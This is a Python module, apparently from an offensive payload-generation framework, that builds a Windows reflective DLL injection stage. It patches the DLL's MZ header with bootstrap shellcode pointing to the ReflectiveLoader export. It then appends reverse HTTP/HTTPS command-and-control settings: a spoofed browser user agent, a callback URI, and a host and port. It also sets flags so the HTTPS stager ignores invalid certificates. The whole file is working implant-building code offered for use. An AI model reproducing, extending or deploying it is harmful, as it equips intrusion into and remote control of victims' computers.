
from keystone import *  # code assembler
from constants import BINARIES_DIR
import os
import pefile
import struct


HOST="127.0.0.1"    # Default Host Address
PORT=4444           # Default Port Number
FORMAT="raw"        # Default Format
CURRENT_STAGER="reverse_https"

class dllinject(object):
    def __init__(self) -> None:
        self.name = type(self).__name__
        self.platform = "windows"
        self.arch = "x86"
        self.sctype = "stage"
        self.stagers = []
        if self.sctype.upper() in ["STAGE", "SINGLE"]:
            # Base Service Communication for shellcode
            # self.stagers.append("bind_tcp")
            # self.stagers.append("reverse_tcp")
            self.stagers.append("reverse_http")
            self.stagers.append("reverse_https")
            # Add extra Service Communication for shellcode
        self.description = "Inject DLL through Reflective Loading."
        # Add your extra configuration here


    def patch_reflectivedll(self, dllfile):
        asm = None
        # Get FileOffset of ReflectiveLoader function address
        dll = pefile.PE(dllfile)
        exportdir = dll.DIRECTORY_ENTRY_EXPORT
        ref_loader_ofs = 0
        bexport = False
        for n in exportdir.symbols:
            if n.name == b"ReflectiveLoader":
                ref_loader_ofs = dll.get_offset_from_rva(n.address)
                bexport = True
                break

        if not bexport:
            exit()

        # Patch Initial MZ Header with Reflective Loader code
        dll.DOS_HEADER.e_magic = 0x5A4D
        dll.DOS_HEADER.e_cblp = 0x00E8
        dll.DOS_HEADER.e_cp = 0
        dll.DOS_HEADER.e_crlc = 0x5B00
        dll.DOS_HEADER.e_cparhdr = 0x4552
        dll.DOS_HEADER.e_minalloc = 0x8955
        dll.DOS_HEADER.e_maxalloc = 0x81E5
        dll.DOS_HEADER.e_ss = 0x30C3
        dll.DOS_HEADER.e_sp = 0x0004
        dll.DOS_HEADER.e_csum = 0xFF00
        dll.DOS_HEADER.e_ip = 0x81D3
        dll.DOS_HEADER.e_cs = 0x00C3
        dll.DOS_HEADER.e_lfarlc = 0x000C
        dll.DOS_HEADER.e_ovno = 0x8900
        dll.DOS_HEADER.e_res = b";Sj\x17P\xff\xd0\x00"

        # Write dll to buffer
        asm = dll.write()
        # Patch Offset 0x0Fh at MZHeader 
        # with actual FileOffset of ReflectiveLoader Procedure
        asm[0x0F:0x0F+4] = struct.pack("<I", (ref_loader_ofs-7))
        # Patch Offset 0x17h at MZHeader 
        # with FileOffset pointing to End of Dll
        EODLL = 0
        for s in dll.sections:
            EODLL = s.PointerToRawData
            EODLL += s.SizeOfRawData
        asm[0x17:0x17+4] = struct.pack("<I", (EODLL-ref_loader_ofs))
        # Insert CONFIGURATION here
        USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
        if CURRENT_STAGER in ("reverse_http", "reverse_https"):
            asm += bytes([0,0,0,0])
            asm += bytes([len(USER_AGENT)+1] + [ord(n) for n in USER_AGENT] + [0])
            asm += bytes([len("POST")+1] + [ord(n) for n in "POST"] + [0])
            asm += bytes([len("/cmd_12345")+1] + [ord(n) for n in "/cmd_12345"] + [0])
            asm += bytes([len(HOST)+1] + [ord(n) for n in HOST] + [0])
            asm += struct.pack("<h", PORT)

        if CURRENT_STAGER == "reverse_https":
            # Search for 84680200h ;HTTP_OPEN_FLAGS
            # ;(0x80000000 | # INTERNET_FLAG_RELOAD
            # ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
            # ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
            # ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
            # ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
            # ; 0x00000200 ) # INTERNET_FLAG_NO_UI
            pos = -1
            pos = asm.find(b"\x00\x02\x68\x84")
            if pos > 0:
                # Replace it with 84E83200h ;HTTP_OPEN_FLAGS
                # ;(0x80000000 | # INTERNET_FLAG_RELOAD
                # ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
                # ; 0x00800000 | # INTERNET_FLAG_SECURE
                # ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
                # ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
                # ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
                # ; 0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
                # ; 0x00001000 | # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
                # ; 0x00000200 ) # INTERNET_FLAG_NO_UI
                asm[pos:pos+4] = b"\x00\x32\xE8\x84"
        
        return asm, len(asm)
                

    def build_shellcode(self):
        asm = None
        cnt = 0
        dllpath = os.path.join(BINARIES_DIR, "dllreflectiveloader.dll")
        asm, cnt = self.patch_reflectivedll(dllpath)
        return asm, cnt
        

